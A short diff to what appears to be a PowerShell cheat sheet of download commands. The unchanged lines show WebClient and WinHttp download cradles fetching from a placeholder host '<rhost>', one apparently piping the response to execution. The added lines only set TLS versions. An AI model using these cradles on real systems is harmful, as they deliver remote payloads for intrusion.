@@ -32,3 +32,7 @@ $webClient = [Net.WebClient]::new(); $webClient.DownloadFile('https://<rhost>', 
 # download a file - ComObject
 [Net.WebRequest]::DefaultWebProxy; [Net.CredentialCache]::DefaultNetworkCredentials; $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://<rhost>',$false);$h.send();ie
 
+
+# configure TLS version
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::'Tls11,Tls12'
+
